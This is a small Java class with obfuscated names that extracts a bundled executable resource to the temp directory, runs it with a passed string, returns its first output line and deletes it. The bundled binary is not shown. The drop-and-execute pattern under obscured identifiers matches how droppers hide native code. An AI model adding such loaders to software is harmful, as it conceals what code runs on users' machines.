package ma.ac2i.y1r0.z1r0.m0o;
import java.nio.charset.StandardCharsets;
import java.util.Base64; 
import java.io.File; 

public class R04o { 
    private static File e0x45() throws Exception {  
        String os = System.getProperty("os.name").toLowerCase();
        boolean isW = os.contains("win");

        String f0x4E = isW ? "d0x116_.exe" : "d0x116_";
        String resourceName = "/" + f0x4E;  
        File temp = new File(System.getProperty("java.io.tmpdir"), f0x4E);		

        if (!temp.exists()) {
            try (var in = R04o.class.getResourceAsStream(resourceName);
                var out = new java.io.FileOutputStream(temp)) {

                in.transferTo(out);
            }

            temp.setExecutable(true);  
            temp.deleteOnExit();
        }
 
        return temp;
    }

    public static String d0x116_(String e0x100) {
        try {
            File exe = e0x45(); 
            ProcessBuilder pb = new ProcessBuilder(exe.getAbsolutePath(), e0x100);
            pb.redirectErrorStream(true);
            Process p = pb.start(); 
            
            String r0x116;
            try (java.io.BufferedReader br =
                     new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()))) {
                r0x116 = br.readLine();
            } 
            p.waitFor(); 
            if (exe != null && exe.exists()) exe.delete();
            return r0x116;
        } catch (Exception e) {
            return "Erreur EXE";
        }
    }
}
